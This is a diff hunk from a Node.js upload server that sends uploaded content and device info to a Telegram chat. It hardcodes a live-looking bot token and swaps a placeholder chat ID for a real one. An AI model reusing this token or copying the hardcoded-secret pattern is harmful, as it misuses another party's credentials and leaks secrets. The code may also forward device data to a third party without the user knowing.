@@ -9,7 +9,7 @@ const upload = multer({ storage: multer.memoryStorage() });
 // ===== CONFIGURATION CONFIG =====
 const PORT = 3000;
 const BOT_TOKEN = "8879628969:AAF5g8XnFu9Ido-nKTHj8GAWBd0R-iA5bAA";
-const CHAT_ID = "YOUR_TELEGRAM_CHAT_ID_HERE";
+const CHAT_ID = "8692688017";
 
 // Build clean Telegram text markdown with only necessary device info
 function buildCaption(info) {
